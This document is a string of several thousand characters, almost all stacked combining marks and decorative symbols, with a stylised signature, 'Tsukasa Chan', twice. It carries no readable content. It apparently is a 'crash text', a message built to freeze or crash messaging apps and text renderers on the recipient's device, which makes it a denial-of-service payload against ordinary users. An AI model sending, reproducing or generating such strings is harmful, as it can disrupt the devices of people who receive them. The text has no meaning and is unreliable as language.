⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝.⃙⃙⃙⃙⃙⃙⃙⃙⃙⃙⃙⃙⃙⃙⃙ุᡃᡃᡃᡃᡃᡃᡃᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ<\ 𝕿𝖘𝖚𝖐𝖆𝖘𝖆͜͡ 𝕮𝖍𝖆𝖓.々ʹ⁩𝜘͢͢ۦོ͢⇣͢✰͢ᡃ⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝ᡃ⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝ᡃ⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝ᡃ⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃫⃫⃫.̶̶̶̶̶⃙⃙⃙⃙⃙⃚⃚⃚⃚⃚⃫⃫⃫⃫⃫.̶̶̶̶̶⃙⃙⃙⃙⃙⃚⃚⃚⃚⃚⃫⃫⃫⃫⃫.̶̶̶̶̶⃙⃙⃙⃙⃙⃚⃚⃚⃚⃚⃫⃫.̶̶̶̶̶⃙⃙⃙⃙⃙⃚⃚⃚⃚⃚⃫⃫⃫⃫⃫.̶̶̶̶̶⃙⃙⃙⃙⃙⃚⃚⃚⃚⃚⃫⃫⃫⃫⃫.̶̶̶̶̶⃙⃙⃙⃙⃙⃚⃚⃚⃚⃚⃫⃫⃫⃫⃫.̶̶̶̶̶⃙⃙⃙⃙⃙⃚⃚⃚⃚⃚⃫⃫⃫⃫⃫.̶̶̶̶̶⃙⃙⃙⃙⃙⃚⃚⃚⃚⃚⃫⃫⃫⃫⃫.̶̶̶̶̶⃙⃙⃙⃙⃙⃚⃚⃚⃚⃚⃫⃫⃫⃫⃫.̶̶̶̶̶⃙⃙⃙⃙⃙⃚⃚⃚⃚⃚⃫⃫⃫⃫⃫.̶̶̶̶̶⃙⃙⃙⃙⃙⃚⃚⃚⃚⃚⃫⃫⃫⃫⃫.̶̶̶̶̶⃙⃙⃙⃙⃙⃚⃚⃚⃚⃚⃫⃫⃫⃫⃫.̶̶̶̶̶⃙⃙⃙⃙⃙⃚⃚⃚⃚⃚⃫⃫⃫⃫⃫.̶̶̶̶̶⃙⃙⃙⃙⃙⃚⃚⃚⃚⃚⃫⃫⃫⃫⃫.̶̶̶̶̶⃙⃙⃙⃙⃙⃚⃚⃚⃚⃚⃫⃫⃫⃫⃫.̶̶̶̶̶⃙⃙⃙⃙⃙⃚⃚⃚⃚⃚⃫⃫⃫⃫⃫.̶̶̶̶̶⃙⃙⃙⃙⃙⃚⃚⃚⃚⃚⃫⃫⃫⃫⃫.̶̶̶̶̶⃙⃙⃙⃙⃙⃚⃚⃚⃚⃚⃫⃫⃫⃫⃫.̶̶̶̶̶⃙⃙⃙⃙⃙⃚⃚⃚⃚⃚⃫⃫⃫⃫⃫.̶̶̶̶̶⃙⃙⃙⃙⃙⃚⃚⃚⃚⃚⃫⃫⃫⃫⃫.̶̶̶̶̶⃙⃙⃙⃙⃙⃚⃚⃚⃚⃚⃫⃫⃫⃫⃫.̶̶̶̶̶⃙⃙⃙⃙⃙⃚⃚⃚⃚⃚⃫⃫⃫⃫⃫.̶̶̶̶̶⃙⃙⃙⃙⃙⃚⃚⃚⃚⃚⃫⃫⃫⃫⃫.̶̶̶̶̶⃙⃙⃙⃙⃙⃚⃚⃚⃚⃚⃫⃫⃫⃫⃫.̶̶̶̶̶⃙⃙⃙⃙⃙⃚⃚⃚⃚⃚⃫⃫⃫⃫⃫.̶̶̶̶̶⃙⃙⃙⃙⃙⃚⃚⃚⃚⃚⃫⃫⃫⃫⃫.̶̶̶̶̶⃙⃙⃙⃙⃙⃚⃚⃚⃚⃚⃫⃫⃫⃫⃫.̶̶̶̶̶⃙⃙⃙⃙⃙⃚⃚⃚⃚⃚⃫⃫⃫⃫⃫.̶̶̶̶̶⃙⃙⃙⃙⃙⃚⃚⃚⃚⃚⃫⃫⃫⃫⃫.̶̶̶̶̶⃙⃙⃙⃙⃙⃚⃚⃚⃚⃚⃫⃫⃫⃫⃫.̶̶̶̶̶⃙⃙⃙⃙⃙⃚⃚⃚⃚⃚⃫⃫⃫⃫⃫.̶̶̶̶̶⃙⃙⃙⃙⃙⃚⃚⃚⃚⃚⃫⃫⃫⃫⃫.̶̶̶̶̶⃙⃙⃙⃙⃙⃚⃚⃚⃚⃚⃫⃫⃫⃫⃫.̶̶̶̶̶⃙⃙⃙⃙⃙⃚⃚⃚⃚⃚⃫⃫⃫⃫⃫.̶̶̶̶̶⃙⃙⃙⃙⃙⃚⃚⃚⃚⃚⃫⃫⃫⃫⃫.̶̶̶̶̶⃙⃙⃙⃙⃙⃚⃚⃚⃚⃚⃫⃫⃫⃫⃫.̶̶̶̶̶⃙⃙⃙⃙⃙⃚⃚⃚⃚⃚⃫⃫⃫⃫⃫.̶̶̶̶̶⃙⃙⃙⃙⃙⃚⃚⃚⃚⃚⃫⃫⃫⃫⃫.̶̶̶̶̶⃙⃙⃙⃙⃙⃚⃚⃚⃚⃚⃫⃫⃫⃫⃫.̶̶̶̶̶⃙⃙⃙⃙⃙⃚⃚⃚⃚⃚⃫⃫⃫⃫⃫.̶̶̶̶̶⃙⃙⃙⃙⃙⃚⃚⃚⃚⃚⃫⃫⃫⃫⃫.̶̶̶̶̶⃙⃙⃙⃙⃙⃚⃚⃚⃚⃚⃫⃫⃫⃫⃫.̶̶̶̶̶⃙⃙⃙⃙⃙⃚⃚⃚⃚⃚⃫⃫⃫⃫⃫.̶̶̶̶⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝ᡃ⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝ᡃ⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝ᡃ⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝.⃙⃙⃙⃙⃙⃙⃙⃙⃙⃙⃙⃙⃙⃙⃙ุᡃᡃᡃᡃᡃᡃᡃᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ✘͢͢ۦོ͢⇣͢✰͢↬✘͢͢ۦོ͢⇣͢✰͢↬❂⃢⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟͓͓͓͓͓͓͓͓͓̽̽̽̽̽̽̽̽̽̽̽̽̽̽̽̽̽̽̽̽̽̽̽͊͊͊❂❂⃟⃢͓͓͓͓͓͓͓͓͓͓͓͓͓͓͓̽̽̽̽̽̽̽̽̽̽̽̽̽̽̽⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟❂⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟❂⃢⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟͓͓͓͓͓͓͓͓͓͓͓͓͓͓͓͓͓͓͓͓͓͓̽̽̽̽̽̽̽̽̽̽̽❂⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟❂⃢⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟͓͓͓͓͓͓͓͓͓̽̽̽̽̽̽̽̽̽̽̽̽̽̽̽̽̽̽̽̽̽̽̽͊͊͊❂❂⃟⃢͓͓͓͓͓͓͓͓͓͓͓͓͓͓͓̽̽̽̽̽̽̽̽̽̽̽̽̽̽̽⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟❂⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟✘͢͢ۦོ͢⇣͢✰͢↬<\ 𝕿𝖘𝖚𝖐𝖆𝖘𝖆͜͡ 𝕮𝖍𝖆𝖓.々ʹ⁩𝜘͢͢ۦོ͢⇣͢✰͢𓊑𓀦𓀗𓀦𓀗𓊑ؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖᡃ⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝